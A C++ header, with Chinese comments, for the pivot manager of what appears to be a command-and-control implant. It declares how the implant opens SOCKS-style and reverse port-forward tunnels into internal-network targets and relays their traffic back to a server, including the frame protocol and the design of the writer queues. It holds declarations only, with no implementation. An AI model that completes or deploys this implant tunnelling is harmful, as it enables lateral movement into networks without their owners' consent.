#pragma once
#include <atomic>
#include <cstdint>
#include <condition_variable>
#include <deque>
#include <functional>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <unordered_map>
#include <vector>

#include "Core/Comms/Platform/INetworkOps.hpp"

namespace cleat {

    // Pivot 数据发送回调(由 AgentContext 注入, 走 CommsManager::Send,
    // 传输加密自动覆盖)
    using PivotDataSender = std::function<void(const std::vector<uint8_t>&)>;

    /**
     * @brief 植入物转发管理器(单例)
     *
     * 单跳 SOCKS/端口转发 v1: Server 下发 PivotStart 后, 本机建立到
     * 内网目标的新 TCP 连接; 目标数据以 PivotData 混合帧推送回 Server,
     * Server 的 PivotData 帧写入目标 socket。
     *
     * 稳定性: 每个 pivot 独立写队列 + 写线程。
     * WriteToTarget(被 TaskGuard 子线程调用)只做 O(1) 入队, 永不阻塞——
     * 此前同步阻塞写(30s 超时)会让子线程卡住, TaskGuard 超时后遗弃线程
     * 造成线程泄漏。写线程负责实际发送, 目标端不读时它自己卡住并在
     * 超时/失败后关闭该 pivot; 队列有字节上限, 下游持续消费不动时
     * 明确失败(关闭)而非无限堆积内存。
     *
     * 协议(帧结构保持 [4B 长度][载荷]):
     *   PivotStart  S→A  params {pivot_id, target_host, target_port}
     *   PivotData   S→A/双向 混合帧 data/params {pivot_id} + '\0' + 原始字节
     *   PivotClose  S→A/双向  {pivot_id, reason}
     *
     * 架构预留多跳: PivotData 帧可链式转发(节点决定是消费还是转发),
     * v1 仅实现单跳。
     */
    class PivotManager {
    public:
        static PivotManager& Instance();

        // 注入数据发送回调(仅一次, AgentContext 初始化时)
        void SetDataSender(PivotDataSender sender);

        // 建立到目标的连接(handler 调用); 失败返回 false
        bool StartPivot(const std::string& pivot_id,
            const std::string& target_host, uint16_t target_port);

        // 设置低带宽通道检查（由 Agent 注入; 低带宽时拒绝新建 pivot）
        using LowBandwidthCheck = std::function<bool()>;
        void SetLowBandwidthCheck(LowBandwidthCheck check);

        // 收到 Server 的代理数据(混合帧二进制体), 写入目标 socket。
        // 非阻塞: 只入队(per-pivot 写队列), 由写线程发送。
        // 返回 false 表示 pivot 已关闭或队列超限(触发关闭)。
        bool WriteToTarget(const std::string& pivot_id, const std::vector<uint8_t>& data);

        // 关闭指定 pivot(Server 主动关闭; 不回帧——Server 已知情)
        void ClosePivot(const std::string& pivot_id, const std::string& reason);

        // 关闭指定 pivot 并向 Server 推送 PivotClose(Agent 侧主动终结时用,
        // 如写队列超限); pivot 不存在时不发帧
        void CloseAndNotify(const std::string& pivot_id, const std::string& reason);

        // 收养一条已建立的连接作为 pivot 出口(rportfwd 用: Agent 侧 accept
        // 的入站连接, 目标连接由 Server 拨出)。失败返回 false(调用方负责
        // 关闭 sock)。
        bool AdoptSocket(const std::string& pivot_id, INetworkOps::SocketHandle sock,
            const std::string& target_host, uint16_t target_port);

        // 向 Server 推送 PivotClose 帧(不动本地状态; 重复发送 Server 端幂等)
        void SendCloseFrame(const std::string& pivot_id, const std::string& reason);
        // 向 Server 推送 PivotOpened 帧(rportfwd 入站连接通告, 须先于
        // AdoptSocket 发送——Server 登记后才能承接后续 PivotData)
        void SendOpenedFrame(const std::string& pivot_id, uint16_t listen_port,
            const std::string& target_host, uint16_t target_port);

        // 关闭所有 pivot(断线/退出时)
        void CloseAll();

        size_t ActiveCount() const;

    private:
        PivotManager();
        ~PivotManager();
        PivotManager(const PivotManager&) = delete;
        PivotManager& operator=(const PivotManager&) = delete;

        struct PivotConnection {
            std::string pivot_id;
            std::string target_host;
            uint16_t target_port = 0;
            INetworkOps::SocketHandle sock = -1;
            std::unique_ptr<std::thread> reader_thread;
            std::unique_ptr<std::thread> writer_thread; // 新增: 写队列消费线程
            std::atomic<bool> running{ false };
            std::atomic<bool> write_failed{ false };    // 写线程失败/队列超限标记

            // 写队列(WriteToTarget 只 push, WriterLoop 只 pop; 锁保护)
            std::mutex write_mu;
            std::condition_variable write_cv;
            std::deque<std::vector<uint8_t>> write_queue;
            size_t queued_bytes = 0; // 队列累计字节(上限控制)
        };

        void RemoveLocked(const std::string& pivot_id);
        void SweepClosed();
        void ReaderLoop(PivotConnection* conn);
        void WriterLoop(PivotConnection* conn);

        // 注册连接(替换同 id 旧连接 + 起读写线程), 锁内完成; 返回裸指针供起线程
        PivotConnection* RegisterLocked(std::unique_ptr<PivotConnection> conn);

        // 写队列字节上限: 下游持续消费不动时关闭而非无限堆积
        static constexpr size_t kMaxQueuedBytes = 4 * 1024 * 1024;

        mutable std::mutex mutex_;
        std::unordered_map<std::string, std::unique_ptr<PivotConnection>> pivots_;
        PivotDataSender sender_;
        std::unique_ptr<INetworkOps> ops_;
        std::atomic<uint64_t> seq_{ 0 };
        LowBandwidthCheck low_bandwidth_check_;
    };

}